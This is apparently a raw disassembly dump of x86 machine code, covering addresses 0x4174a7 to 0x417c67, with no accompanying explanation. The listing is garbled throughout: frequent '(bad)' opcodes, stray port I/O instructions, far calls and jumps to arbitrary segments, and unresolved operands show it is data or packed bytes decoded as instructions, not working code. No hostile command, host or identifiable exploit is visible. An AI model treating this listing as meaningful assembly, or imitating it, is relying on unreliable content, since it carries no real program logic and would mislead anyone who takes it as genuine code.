  4174a7:	inc    edi
  4174a8:	(bad)  
  4174a9:	add    eax,ebp
  4174ab:	out    dx,al
  4174ac:	(bad)  
  4174ad:	pop    esp
  4174ae:	add    BYTE PTR [eax+ebp*8+0x6a],dh
  4174b2:	(bad)  
  4174b3:	clc    
  4174b4:	test   eax,0xfa744d0d
  4174b9:	mov    ebx,0xab4d3f8e
  4174be:	push   eax
  4174bf:	aaa    
  4174c0:	dec    edi
  4174c1:	jl     0x4174e7
  4174c3:	add    al,0x1a
  4174c5:	sub    ah,BYTE PTR [edx-0x3df87ed3]
  4174cb:	fstp   QWORD PTR [si]
  4174ce:	sub    al,0xd5
  4174d0:	dec    ebx
  4174d1:	stos   BYTE PTR es:[edi],al
  4174d2:	in     al,0x63
  4174d4:	or     al,dh
  4174d6:	sbb    ch,BYTE PTR [ebx-0x39b487ee]
  4174dc:	cmp    ecx,DWORD PTR [edx+0x54]
  4174df:	ins    BYTE PTR es:[edi],dx
  4174e0:	jbe    0x41751f
  4174e2:	(bad)  
  4174e3:	in     al,dx
  4174e4:	pop    ebx
  4174e5:	shr    BYTE PTR [ebp+0x61655fec],1
  4174eb:	retf   
  4174ec:	rol    DWORD PTR [ebp+0x3f9d3cd9],cl
  4174f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174f3:	mov    eax,ds:0xc3d050fb
  4174f8:	jbe    0x4174a0
  4174fa:	inc    eax
  4174fb:	or     al,0x62
  4174fd:	retf   
  4174fe:	xor    eax,edx
  417500:	lds    eax,FWORD PTR [ecx-0x63]
  417503:	inc    eax
  417504:	retf   0xcae1
  417507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417508:	adc    BYTE PTR [eax-0x3797b375],bl
  41750e:	aas    
  41750f:	test   BYTE PTR [edi-0xf99c13c],ch
  417515:	jmp    0x8443fa94
  41751a:	jl     0x41754a
  41751c:	sub    eax,0x96f7d852
  417521:	stos   BYTE PTR es:[edi],al
  417522:	cs pop es
  417524:	mov    ah,0x33
  417526:	jno    0x4174ac
  417528:	mov    ebx,0xfac779b
  41752d:	out    0x9e,eax
  41752f:	lock and edx,DWORD PTR [edi-0x6b]
  417533:	pop    ebp
  417534:	xor    edi,DWORD PTR [ecx+0x29]
  417537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417538:	test   ch,dh
  41753a:	inc    ebx
  41753b:	popa   
  41753c:	add    BYTE PTR [ecx],bh
  41753e:	into   
  41753f:	inc    ecx
  417540:	xlat   BYTE PTR ds:[ebx]
  417541:	mov    dl,BYTE PTR [edx-0x210b0400]
  417547:	(bad)  
  417548:	adc    ah,bh
  41754a:	adc    BYTE PTR [ecx+0x3f0d48b2],ch
  417550:	and    ch,0x55
  417553:	add    bh,BYTE PTR [ebp-0x38]
  417556:	call   0x4c9a:0x197221f2
  41755d:	js     0x41750a
  41755f:	sub    edi,DWORD PTR [ecx]
  417561:	jbe    0x417516
  417563:	or     al,0xb0
  417565:	pop    es
  417566:	adc    esp,eax
  417568:	push   edi
  417569:	sbb    BYTE PTR [ecx],dl
  41756b:	mov    dl,0xec
  41756d:	stos   BYTE PTR es:[edi],al
  41756e:	sbb    al,0xb9
  417570:	adc    edi,DWORD PTR [edx-0x69ef9841]
  417576:	pslld  mm1,mm6
  417579:	mov    bl,0x5b
  41757b:	popa   
  41757c:	jge    0x4175eb
  41757e:	pop    ds
  41757f:	mov    edi,0x64c5bdd0
  417584:	int3   
  417585:	fstp   TBYTE PTR [ebx+0x4ddb41d4]
  41758b:	call   0x36f4:0xa4fc5847
  417592:	xchg   edi,eax
  417593:	retf   0x2ce3
  417596:	add    BYTE PTR [eax+ecx*2-0x582af471],ch
  41759d:	push   ecx
  41759e:	xchg   esp,eax
  41759f:	xor    ch,dl
  4175a1:	mov    dl,0xb9
  4175a3:	inc    eax
  4175a4:	popf   
  4175a5:	das    
  4175a6:	outs   dx,DWORD PTR ds:[esi]
  4175a7:	sub    dl,BYTE PTR [ebp-0x16]
  4175aa:	inc    ebx
  4175ab:	adc    ah,cl
  4175ad:	and    BYTE PTR [eax+0xf0b2891],0x6a
  4175b4:	repnz dec esp
  4175b6:	(bad)  
  4175b8:	inc    esi
  4175b9:	adc    esp,DWORD PTR [edx]
  4175bb:	retf   0x32bc
  4175be:	xchg   BYTE PTR [edi-0x6e],cl
  4175c1:	xor    edi,DWORD PTR [esi]
  4175c3:	in     al,0x6d
  4175c5:	cmp    esi,DWORD PTR [esp+eax*2-0x65]
  4175c9:	and    ebx,DWORD PTR [ecx+0x45072348]
  4175cf:	js     0x417571
  4175d1:	fstp   QWORD PTR [ecx+ebx*1-0x6d]
  4175d5:	inc    edi
  4175d6:	sub    eax,0xfd0c86a7
  4175db:	jnp    0x417636
  4175dd:	mov    ?,ecx
  4175df:	ror    BYTE PTR [ebx+0x4b211a8],0xfc
  4175e6:	mov    DWORD PTR [edx+eax*2+0x577da11a],esp
  4175ed:	jbe    0x4175a2
  4175ef:	push   ds
  4175f0:	pop    esp
  4175f1:	and    eax,0x3503c8fe
  4175f6:	repz push cs
  4175f8:	or     DWORD PTR [ebx-0x25],eax
  4175fb:	add    edi,DWORD PTR [ebp+0x72]
  4175fe:	sbb    dl,BYTE PTR [ebx-0x20749d89]
  417604:	dec    ebp
  417605:	(bad)  
  417606:	and    esi,edi
  417608:	(bad)  
  41760a:	xchg   BYTE PTR ds:0xb0dd47d6,bh
  417610:	xchg   ebp,eax
  417611:	repnz cli 
  417613:	das    
  417614:	or     edi,DWORD PTR [edi+0x32]
  417617:	sbb    ah,BYTE PTR [ebp-0x72]
  41761a:	adc    al,0x7
  41761c:	les    ecx,FWORD PTR [edi-0x708b7c46]
  417622:	out    dx,eax
  417623:	xor    BYTE PTR [eax],bl
  417625:	retf   
  417626:	aas    
  417627:	fild   DWORD PTR [edx+0x68]
  41762a:	stos   DWORD PTR es:[edi],eax
  41762b:	sub    bl,ch
  41762d:	repz cwd 
  417630:	bnd jo 0x4176a4
  417633:	cdq    
  417634:	mov    esi,0xcc16f77c
  417639:	lea    esi,[esi+0x4c3778d7]
  41763f:	inc    edi
  417640:	pop    eax
  417642:	fmul   st,st(6)
  417644:	out    dx,eax
  417645:	or     eax,0xa2e925f9
  41764a:	push   ecx
  41764b:	xchg   ecx,eax
  41764c:	aam    0xd3
  41764e:	outs   dx,DWORD PTR ds:[esi]
  41764f:	in     al,dx
  417650:	xchg   edi,eax
  417651:	out    0xdb,eax
  417653:	pop    ebp
  417654:	(bad)  [edi+0x63a07148]
  41765a:	push   esp
  41765b:	inc    edx
  41765c:	leave  
  41765d:	out    dx,eax
  41765e:	fs (bad) 
  417660:	retf   
  417661:	mov    cs,WORD PTR gs:[eax+esi*1]
  417665:	dec    esp
  417666:	jbe    0x417670
  417668:	scas   eax,DWORD PTR es:[edi]
  417669:	(bad)  
  41766a:	out    0x83,al
  41766c:	stos   DWORD PTR es:[edi],eax
  41766d:	imul   eax,ecx,0x77
  417670:	push   cs
  417671:	call   0x643:0xfb7f3c42
  417678:	jae    0x417687
  41767a:	test   BYTE PTR [esi-0x1a7a46ae],cl
  417680:	out    0xa4,eax
  417682:	mov    dl,0x6c
  417684:	inc    DWORD PTR [edi-0x17]
  417687:	pop    ds
  417688:	retf   
  417689:	test   eax,0x1f9597e6
  41768e:	xchg   edi,eax
  41768f:	sub    bh,0xa9
  417692:	push   ds
  417693:	mov    ebx,0x87459a18
  417698:	mov    BYTE PTR [eax+ebp*8-0xf],cl
  41769c:	and    al,BYTE PTR [eax]
  41769e:	fwait
  41769f:	fwait
  4176a0:	xchg   edx,eax
  4176a1:	mov    esp,0xad9938c6
  4176a6:	adc    bh,ah
  4176a8:	pop    ds
  4176a9:	mov    eax,ds:0xbcac6188
  4176ae:	push   ss
  4176af:	je     0x417647
  4176b1:	mov    eax,0xcc5017e7
  4176b6:	push   ebp
  4176b7:	mov    ds:0x6f505ce2,eax
  4176bc:	shl    DWORD PTR [edx-0x578dfe15],0xb8
  4176c3:	call   FWORD PTR [ecx*4+0x28d23c13]
  4176ca:	mov    ds:0x4499b83,eax
  4176cf:	pop    esi
  4176d0:	ret    0xf75c
  4176d3:	jns    0x417701
  4176d5:	fs out dx,eax
  4176d7:	push   eax
  4176d8:	and    al,0x6f
  4176da:	xor    BYTE PTR [ebp+0x44],cl
  4176dd:	jae    0x417663
  4176df:	(bad)  
  4176e0:	cmp    eax,0x6916fdb9
  4176e5:	pop    edi
  4176e6:	xor    al,0xb6
  4176e8:	in     eax,0xe9
  4176ea:	pushf  
  4176eb:	imul   ebp,DWORD PTR [ebp-0x786bc49e],0x65502516
  4176f5:	inc    ebp
  4176f6:	xchg   esp,eax
  4176f7:	sbb    DWORD PTR [ecx],ecx
  4176f9:	xchg   ch,bl
  4176fb:	out    dx,eax
  4176fc:	ja     0x4176aa
  4176fe:	outs   dx,DWORD PTR ds:[esi]
  4176ff:	add    al,0x99
  417701:	pop    ss
  417702:	out    0x71,eax
  417704:	mov    ebp,0x6713cf4b
  417709:	jl     0x4176c7
  41770b:	lods   al,BYTE PTR ds:[esi]
  41770c:	xor    al,cl
  41770e:	dec    edi
  41770f:	sbb    ecx,eax
  417711:	xor    al,0x8b
  417713:	pop    edi
  417714:	xchg   ecx,eax
  417715:	adc    ah,dh
  417717:	jbe    0x41776d
  417719:	ds xchg esi,eax
  41771b:	pusha  
  41771c:	push   ds
  41771d:	inc    eax
  41771e:	lds    ebp,FWORD PTR [edx]
  417720:	push   ecx
  417721:	adc    ah,bl
  417723:	(bad)  
  417725:	inc    esi
  417726:	cmc    
  417727:	or     DWORD PTR [esi+0x1df5cf79],ebx
  41772d:	jmp    0x41779c
  41772f:	xchg   ecx,eax
  417730:	sahf   
  417731:	mov    ds:0x22549a4a,al
  417736:	sbb    ebx,DWORD PTR [ebp+edx*2-0xa604f30]
  41773d:	mul    al
  41773f:	fidivr DWORD PTR [ebx+0x51]
  417742:	bound  edx,QWORD PTR [edx-0x65]
  417745:	clc    
  417746:	dec    ebx
  417747:	jl     0x41779c
  417749:	in     eax,0x7
  41774b:	xor    bh,0x72
  41774e:	and    edx,DWORD PTR [eax+0x3f]
  417751:	(bad)
  417754:	dec    ecx
  417755:	dec    esp
  417756:	cs pop ecx
  417758:	test   dh,ah
  41775a:	call   0x3806112b
  41775f:	inc    esi
  417760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417761:	je     0x417745
  417763:	loope  0x4177ac
  417765:	adc    BYTE PTR [ecx-0x48acfae6],ch
  41776b:	out    0x48,al
  41776d:	inc    ebp
  41776e:	cs jb  0x417755
  417771:	xchg   BYTE PTR [ebp+0x43],bl
  417774:	cwde   
  417775:	not    cl
  417777:	mov    eax,ds:0x46952641
  41777c:	mov    al,ds:0xb3873518
  417781:	jge    0x41778d
  417783:	shl    BYTE PTR [edx+0x7ea17518],0x66
  41778a:	push   ds
  41778b:	jmp    0x900e:0xe2c5
  417791:	ins    DWORD PTR es:[edi],dx
  417792:	in     eax,dx
  417793:	push   ebp
  417794:	mov    BYTE PTR [eax],ah
  417796:	js     0x41778f
  417798:	push   edi
  417799:	mov    ?,WORD PTR [ecx]
  41779b:	sub    dl,BYTE PTR [esi]
  41779d:	cmp    ebp,DWORD PTR [edx-0x16e0932e]
  4177a3:	pop    ds
  4177a4:	push   ss
  4177a5:	mov    bh,0xc8
  4177a7:	je     0x41772b
  4177a9:	mov    edi,0x1c510a48
  4177ae:	adc    BYTE PTR [ecx+ebp*2-0x7093f1aa],0x26
  4177b6:	pop    ebp
  4177b7:	adc    eax,0x4540cedd
  4177bc:	mov    ?,WORD PTR [esi-0x7c]
  4177bf:	mov    ah,0x66
  4177c1:	sti    
  4177c2:	push   es
  4177c3:	and    ch,BYTE PTR [ecx-0x49]
  4177c6:	aaa    
  4177c7:	mov    ebp,0xa5e1565d
  4177cc:	add    esp,ebp
  4177ce:	ins    DWORD PTR es:[edi],dx
  4177cf:	and    eax,0x1e065db3
  4177d4:	retf   0x9186
  4177d7:	jp     0x417820
  4177d9:	into   
  4177da:	ja     0x41783e
  4177dc:	mov    ebx,0x9da9dcac
  4177e1:	popf   
  4177e2:	lock inc esp
  4177e4:	xchg   esi,eax
  4177e5:	fwait
  4177e6:	enter  0x96d6,0x7d
  4177ea:	stos   DWORD PTR es:[edi],eax
  4177eb:	mov    bh,0x79
  4177ed:	mov    al,0x80
  4177ef:	pop    esi
  4177f0:	mov    ds,WORD PTR [eax+0x3405112c]
  4177f6:	imul   ebp,DWORD PTR [ebx],0x0
  4177f9:	xchg   esi,eax
  4177fa:	jl     0x4177c2
  4177fc:	out    0x84,al
  4177fe:	xchg   ebx,eax
  4177ff:	out    0xad,eax
  417801:	retf   0x4335
  417804:	xor    al,0x3e
  417806:	or     DWORD PTR [ecx],edi
  417808:	jmp    0x4177a2
  41780a:	bswap  ecx
  41780c:	and    al,0x1e
  41780e:	mov    eax,eax
  417810:	out    0x99,eax
  417812:	sub    ebp,DWORD PTR [ecx-0x28662830]
  417818:	(bad)  
  417819:	mov    eax,ds:0x9ae76e58
  41781e:	push   esi
  41781f:	xchg   esi,eax
  417820:	and    eax,0x71843ffd
  417825:	jb     0x4178a1
  417827:	fs aad 0x3d
  41782a:	idiv   esp
  41782c:	scas   eax,DWORD PTR es:[edi]
  41782d:	inc    esp
  41782e:	mov    esi,0x7a2ecf1a
  417833:	aad    0xf3
  417835:	mov    cl,bl
  417837:	xchg   esp,eax
  417838:	push   ebx
  417839:	xchg   esp,eax
  41783a:	fmul   QWORD PTR [edx-0x45]
  41783d:	xchg   esi,eax
  41783e:	add    al,0xd
  417840:	ss jns 0x4177e1
  417843:	dec    ecx
  417844:	xor    DWORD PTR [ebp-0x4ea4f359],ebp
  41784a:	int    0x79
  41784c:	ins    DWORD PTR es:[edi],dx
  41784d:	call   0x9f0b356d
  417852:	jle    0x41784e
  417854:	out    0x57,al
  417856:	xor    eax,0x23b03f63
  41785b:	dec    ebp
  41785c:	popa   
  41785d:	xchg   edx,eax
  41785e:	mov    ebp,0x75e83e17
  417863:	mov    DWORD PTR [edi-0x4675d634],esp
  417869:	sbb    DWORD PTR [esp+eax*4-0x7d],0x51f65bd1
  417871:	mov    WORD PTR [edi+0x287918a8],es
  417877:	xor    al,0xea
  417879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41787a:	xor    bh,BYTE PTR [esi+0x7695048b]
  417880:	mov    ecx,0x8447fde6
  417885:	cmp    DWORD PTR [ebx+0x63],0x849fb19e
  41788c:	pop    ds
  41788d:	jp     0x417905
  41788f:	in     al,dx
  417890:	mov    DWORD PTR [edx+0x4c],ecx
  417893:	mov    edx,0x5bff3ddb
  417898:	cwde   
  417899:	repz adc BYTE PTR [edi+0x822e379],cl
  4178a0:	sbb    al,0x61
  4178a2:	sub    dl,BYTE PTR [edx+eiz*2-0x42]
  4178a6:	jecxz  0x4178ea
  4178a8:	sbb    BYTE PTR [ebx-0x1b336c0c],0x78
  4178af:	call   0xac037455
  4178b4:	and    al,0xd9
  4178b6:	aaa    
  4178b7:	cmp    DWORD PTR [ebp-0x7],ecx
  4178ba:	rol    DWORD PTR [esp+ebp*8-0x6d93c082],0x9e
  4178c2:	inc    ebx
  4178c3:	cmc    
  4178c4:	mov    ds:0x445bf942,eax
  4178c9:	push   ebx
  4178ca:	adc    DWORD PTR [edx+ebx*1+0x72],esp
  4178ce:	fisttp WORD PTR ds:0xa006167c
  4178d4:	xchg   ebp,eax
  4178d5:	inc    esi
  4178d6:	xchg   ebx,eax
  4178d7:	or     edi,esp
  4178d9:	ret    0x8d0e
  4178dc:	mov    ds:0xd064fc24,al
  4178e1:	imul   ecx,edx,0xa4452c67
  4178e7:	sbb    al,0x5b
  4178e9:	dec    esi
  4178ea:	push   ebx
  4178eb:	(bad)  
  4178ec:	in     eax,dx
  4178ed:	test   al,ch
  4178ef:	jmp    0xc25a:0x83695d77
  4178f6:	jl     0x41795e
  4178f8:	je     0x417945
  4178fa:	das    
  4178fb:	cmp    DWORD PTR [esi],edx
  4178fd:	(bad)  
  4178ff:	push   eax
  417900:	daa    
  417901:	icebp  
  417902:	fisubr DWORD PTR [eax+0x13]
  417905:	jecxz  0x4178a0
  417907:	sbb    eax,0xe23a1e3d
  41790c:	push   ebx
  41790d:	jp     0x41791a
  41790f:	call   DWORD PTR [ebx]
  417911:	lahf   
  417912:	xor    al,0x31
  417914:	lds    ebp,FWORD PTR [edx+0x27]
  417917:	js     0x4178d8
  417919:	lods   al,BYTE PTR ds:[esi]
  41791a:	ror    DWORD PTR [esi],0xc6
  41791d:	jo     0x4178db
  41791f:	leave  
  417920:	loopne 0x4178e0
  417922:	es or  al,0xc6
  417925:	mov    ch,0xe5
  417927:	icebp  
  417928:	cmc    
  417929:	or     edi,DWORD PTR [ebx+0x772e89c6]
  41792f:	cmp    DWORD PTR ds:0x3db1ac5a,esi
  417935:	xchg   esp,eax
  417936:	push   esp
  417937:	mov    ebx,0xef7ef86e
  41793c:	inc    edi
  41793d:	mov    al,0xb9
  41793f:	sti    
  417940:	cmp    BYTE PTR [edi-0x56],bl
  417943:	xchg   ah,bh
  417945:	scas   eax,DWORD PTR es:[edi]
  417946:	add    esp,esi
  417948:	inc    edi
  417949:	aas    
  41794a:	xlat   BYTE PTR ds:[ebx]
  41794b:	and    dh,BYTE PTR [eax]
  41794d:	(bad)  
  41794e:	fnsave [esi+0x3cc64884]
  417954:	hlt    
  417955:	stc    
  417956:	and    esp,DWORD PTR [edx]
  417958:	jmp    0x4179c2
  41795a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41795b:	ds leave 
  41795d:	call   0x819a:0x734c7b18
  417964:	loopne 0x4178e7
  417966:	jbe    0x417922
  417968:	clc    
  417969:	xrelease xchg BYTE PTR [eax+0x13a2eb6f],bh
  417970:	xchg   ecx,eax
  417971:	adc    ch,dh
  417973:	(bad)  
  417974:	cli    
  417975:	xor    DWORD PTR [eax],ebp
  417977:	mov    ecx,0x2dc043e2
  41797c:	es cli 
  41797e:	jb     0x41793c
  417980:	pop    esi
  417981:	cmp    eax,0x1a80b714
  417986:	xchg   ebx,eax
  417987:	fld    QWORD PTR [esp+ebx*8]
  41798a:	dec    edi
  41798b:	jb     0x417950
  41798d:	stc    
  41798e:	add    al,0xa5
  417990:	aam    0x16
  417992:	xchg   ebx,eax
  417993:	bound  ecx,QWORD PTR ss:[esi-0x68]
  417997:	sub    eax,0xd7da3868
  41799c:	and    al,0xc4
  41799e:	dec    ebp
  41799f:	hlt    
  4179a0:	popa   
  4179a1:	sbb    DWORD PTR [ecx+0x35],ebp
  4179a4:	pop    esp
  4179a5:	xor    al,0xe4
  4179a7:	popf   
  4179a8:	pop    edx
  4179a9:	mov    fs,WORD PTR [esi+eax*4]
  4179ac:	mov    esi,0x566c3e9d
  4179b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179b2:	push   edi
  4179b3:	adc    edx,DWORD PTR [edi+0x65c62d28]
  4179b9:	sub    BYTE PTR ds:0xadcdca0b,cl
  4179bf:	lock mov ebx,0x581dbe1a
  4179c5:	in     eax,dx
  4179c6:	enter  0x92d3,0x53
  4179ca:	imul   dl
  4179cc:	xchg   edi,eax
  4179cd:	pop    esi
  4179ce:	sub    eax,0x6c9e7fe9
  4179d3:	adc    BYTE PTR [ebp-0x28354350],0x4c
  4179da:	add    edx,DWORD PTR [esi]
  4179dc:	mov    ebp,0x5caa0d76
  4179e1:	dec    ebx
  4179e2:	sar    dh,1
  4179e4:	add    al,0x4e
  4179e6:	in     eax,0x5e
  4179e8:	push   eax
  4179e9:	(bad)  
  4179ea:	(bad)  
  4179eb:	jmp    0xd91d7c7d
  4179f0:	dec    esi
  4179f1:	ins    DWORD PTR es:[edi],dx
  4179f2:	sub    al,0x86
  4179f4:	push   eax
  4179f5:	loopne 0x417a1e
  4179f7:	out    dx,al
  4179f8:	mov    dh,0xe
  4179fa:	xor    bh,BYTE PTR ds:0x1fb79e26
  417a00:	fstp   TBYTE PTR [edx+0x76]
  417a03:	jne    0x417a61
  417a05:	pushf  
  417a06:	jnp    0x4179df
  417a08:	call   DWORD PTR [edi+0x34]
  417a0b:	in     al,dx
  417a0c:	mov    al,0x35
  417a0e:	mov    edx,0xd51c33af
  417a13:	jmp    0x8f227422
  417a18:	jmp    0x3338:0x7ee158a2
  417a1f:	les    ecx,FWORD PTR [ebp+ebx*1-0x38]
  417a23:	sbb    edi,ebx
  417a25:	and    edx,esp
  417a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a28:	cs ret 
  417a2a:	sub    DWORD PTR [esi],ebx
  417a2c:	(bad)  
  417a2d:	and    eax,0xc3e8cad1
  417a32:	cmp    al,0xe7
  417a34:	ss push 0xffffff81
  417a37:	mov    ds:0x706864d7,eax
  417a3c:	xchg   ecx,eax
  417a3d:	jmp    0x417a8a
  417a3f:	pop    ebx
  417a40:	aaa    
  417a41:	xchg   DWORD PTR [edx-0x5a],ebx
  417a44:	mov    bl,dh
  417a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a47:	xchg   edi,eax
  417a48:	dec    eax
  417a49:	(bad)  
  417a4a:	or     eax,DWORD PTR [ebx-0x682788cc]
  417a50:	mov    al,0x8b
  417a52:	iret   
  417a53:	xchg   edi,eax
  417a54:	aam    0x1d
  417a56:	in     eax,dx
  417a57:	xor    DWORD PTR [edx-0x2],eax
  417a5a:	fistp  DWORD PTR ss:[ecx]
  417a5d:	sub    bl,0x9f
  417a60:	mov    ah,0x1b
  417a62:	mov    eax,ds:0x7beaf2e7
  417a67:	es push 0xffffffbd
  417a6a:	sub    edi,DWORD PTR [edx-0x2f]
  417a6d:	inc    edi
  417a6e:	fdivr  DWORD PTR [esi]
  417a70:	jg     0x417a8f
  417a72:	sbb    bl,BYTE PTR [esi]
  417a74:	(bad)  
  417a75:	sbb    BYTE PTR [ebx],bl
  417a77:	jecxz  0x417a55
  417a79:	cmp    BYTE PTR [ebx-0x2cab5796],cl
  417a7f:	jecxz  0x417a54
  417a81:	push   edi
  417a82:	cmp    al,0x67
  417a84:	das    
  417a85:	aad    0xbe
  417a87:	jp     0x417a13
  417a89:	mov    ah,0x8
  417a8b:	push   eax
  417a8c:	jecxz  0x417b01
  417a8e:	repnz pop esp
  417a90:	out    dx,eax
  417a91:	ins    DWORD PTR es:[edi],dx
  417a92:	xchg   BYTE PTR ds:0x458d377d,dl
  417a98:	sub    al,0x12
  417a9a:	popf   
  417a9b:	int    0x3b
  417a9d:	cmp    BYTE PTR [edi+0x7460af0f],bl
  417aa3:	push   ecx
  417aa4:	mov    edx,DWORD PTR [edi+0x36]
  417aa7:	push   edx
  417aa8:	loop   0x417aad
  417aaa:	in     eax,dx
  417aab:	inc    edi
  417aac:	repz ss mov dl,0x1b
  417ab0:	cld    
  417ab1:	scas   eax,DWORD PTR es:[edi]
  417ab2:	rol    DWORD PTR [edx+0x72],1
  417ab5:	aam    0xeb
  417ab7:	xlat   BYTE PTR ds:[ebx]
  417ab8:	jmp    0xcd00:0x7cdf64da
  417abf:	pop    ebx
  417ac0:	push   edx
  417ac1:	and    eax,0x8a42200a
  417ac6:	cmp    al,0x4d
  417ac8:	repnz pop es
  417aca:	call   ecx
  417acc:	adc    al,0x91
  417ace:	in     al,dx
  417acf:	ss pop esp
  417ad1:	xchg   esp,eax
  417ad2:	mov    ebp,DWORD PTR [esi-0x45eb6024]
  417ad8:	cmp    ebp,DWORD PTR [ebp+0x15]
  417adb:	fnstsw WORD PTR [edi]
  417add:	data16 cmp BYTE PTR [eax+eax*1-0x6b30ae33],dl
  417ae5:	dec    esp
  417ae6:	pop    ss
  417ae7:	pop    ebp
  417ae8:	push   ss
  417ae9:	and    ebx,DWORD PTR [edi]
  417aeb:	retf   0xd85d
  417aee:	adc    ebp,esp
  417af0:	dec    ecx
  417af1:	jo     0x417acb
  417af3:	mov    ecx,0x2dec1ee2
  417af8:	mov    DWORD PTR [edi+ebp*1],esp
  417afb:	inc    edi
  417afc:	cmp    al,0x98
  417afe:	cmp    al,0x70
  417b00:	fadd   QWORD PTR [edi+ecx*4-0x3a0cd910]
  417b07:	mov    ds:0xb66adcce,eax
  417b0c:	sti    
  417b0d:	mov    eax,ds:0x9edaf761
  417b12:	ds faddp st(1),st
  417b15:	adc    BYTE PTR [ebp-0x1d],dh
  417b18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b19:	or     BYTE PTR ds:0xad374350,dh
  417b1f:	sub    eax,0x8fee1703
  417b24:	test   BYTE PTR [ebx+0x7d815e6a],dh
  417b2a:	into   
  417b2b:	inc    ecx
  417b2c:	mov    dl,0x82
  417b2e:	mov    esi,0x2ed36c04
  417b33:	loop   0x417b0e
  417b35:	aam    0x22
  417b37:	push   edi
  417b38:	and    al,0x9a
  417b3a:	daa    
  417b3b:	pop    eax
  417b3c:	das    
  417b3d:	arpl   dx,di
  417b3f:	(bad)  
  417b40:	into   
  417b41:	sub    BYTE PTR [edi+ecx*4],0x5
  417b45:	sbb    ah,BYTE PTR [ebx]
  417b47:	xchg   esp,eax
  417b48:	xchg   ebp,eax
  417b49:	in     eax,0x74
  417b4b:	lea    esp,[ebp+0x27]
  417b4e:	and    eax,0x523c2c9c
  417b53:	push   esp
  417b54:	inc    ecx
  417b55:	scas   eax,DWORD PTR es:[edi]
  417b56:	es mov bl,0x58
  417b59:	xor    ch,BYTE PTR [esi]
  417b5b:	push   ebx
  417b5c:	xor    eax,0xb6e31e34
  417b61:	dec    edx
  417b62:	inc    eax
  417b63:	push   ebp
  417b64:	mov    eax,ds:0x7e120592
  417b69:	add    DWORD PTR [ebx],0xef46dab0
  417b6f:	pop    ds
  417b70:	lods   eax,DWORD PTR ds:[esi]
  417b71:	pop    es
  417b72:	push   ds
  417b73:	mov    ecx,0x7d9c480a
  417b78:	sbb    bl,BYTE PTR [ebx-0x75a07cba]
  417b7e:	or     edi,DWORD PTR [edx-0x52]
  417b81:	stos   DWORD PTR es:[edi],eax
  417b82:	xchg   esp,eax
  417b83:	or     edi,eax
  417b85:	cmp    al,0x73
  417b87:	mov    eax,ds:0x7d6c2eee
  417b8c:	scas   al,BYTE PTR es:[edi]
  417b8d:	inc    eax
  417b8e:	xchg   DWORD PTR [ebx-0x43d01a90],esi
  417b94:	scas   eax,DWORD PTR es:[edi]
  417b95:	bound  ebp,QWORD PTR [ebp-0x711ac2c3]
  417b9b:	or     BYTE PTR [eax-0x1bd35ed2],0xeb
  417ba2:	jecxz  0x417b3a
  417ba4:	pop    esp
  417ba5:	loope  0x417bd2
  417ba7:	mov    ?,esi
  417ba9:	dec    ebx
  417baa:	fs jno 0x417b50
  417bad:	in     al,dx
  417bae:	bound  edx,QWORD PTR [ecx]
  417bb0:	(bad)  
  417bb1:	retf   
  417bb2:	nop
  417bb3:	fdivr  st(2),st
  417bb5:	push   edi
  417bb6:	(bad)
  417bbb:	mov    al,0xb8
  417bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bbe:	cmp    edi,DWORD PTR [esi+0x37]
  417bc1:	mov    eax,ds:0xba394be
  417bc6:	cld    
  417bc7:	sub    esi,DWORD PTR [ecx]
  417bc9:	push   ss
  417bca:	jmp    0xc9c18688
  417bcf:	inc    BYTE PTR [ebp-0x3eab449d]
  417bd5:	pop    esp
  417bd6:	jo     0x417c01
  417bd8:	or     ch,dh
  417bda:	and    al,0x5e
  417bdc:	pop    es
  417bdd:	fidiv  WORD PTR [eax]
  417bdf:	sbb    al,0xff
  417be1:	pop    esp
  417be2:	adc    dh,bl
  417be4:	pop    ecx
  417be5:	mov    ebx,0x8e1a539d
  417bea:	clc    
  417beb:	lods   eax,DWORD PTR ds:[esi]
  417bec:	dec    ecx
  417bed:	and    ch,BYTE PTR [ebx+0x25b39d8c]
  417bf3:	ins    DWORD PTR es:[edi],dx
  417bf4:	fdivr  st(4),st
  417bf6:	xchg   DWORD PTR [edi+0x10],edx
  417bf9:	cmp    BYTE PTR [esp+ecx*4-0x32c1c31],bh
  417c00:	std    
  417c01:	shr    BYTE PTR [ebx],0x79
  417c04:	pusha  
  417c05:	xchg   edx,eax
  417c06:	jp     0x417c36
  417c08:	sbb    ebx,DWORD PTR [ecx+edx*4]
  417c0b:	cmp    dl,BYTE PTR [eax-0x39]
  417c0e:	mov    ch,0xec
  417c10:	mov    ds:0x3287eb9a,eax
  417c15:	adc    edx,DWORD PTR [ebp-0x263a774]
  417c1b:	sahf   
  417c1c:	or     dh,bl
  417c1e:	add    eax,0x6573a3e
  417c23:	int    0x65
  417c25:	das    
  417c26:	hlt    
  417c27:	pop    ebx
  417c28:	cmp    edx,DWORD PTR [ecx+0x524619e2]
  417c2e:	jo     0x417c0f
  417c30:	mov    eax,ds:0xb652b168
  417c35:	jmp    0x1d8810d5
  417c3a:	aaa    
  417c3b:	scas   eax,DWORD PTR es:[edi]
  417c3c:	bound  esp,QWORD PTR [edi]
  417c3e:	sub    BYTE PTR [edi+0x2f999e72],bl
  417c44:	push   ebx
  417c45:	fcomp  QWORD PTR [ebx]
  417c47:	(bad)  
  417c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c49:	xor    DWORD PTR [edx],eax
  417c4b:	not    BYTE PTR [eax+0x61bf9ec5]
  417c51:	mov    bh,BYTE PTR [edi-0x33ba55b2]
  417c57:	outs   dx,BYTE PTR ds:[esi]
  417c58:	cmp    eax,0xbccbf5f7
  417c5d:	xchg   esp,eax
  417c5e:	sub    al,0xc9
  417c60:	push   ebp
  417c61:	cmp    al,0xa8
  417c63:	fistp  DWORD PTR [edi+0x13]
  417c66:	push   esi
  417c67:	loope  0x417c8e
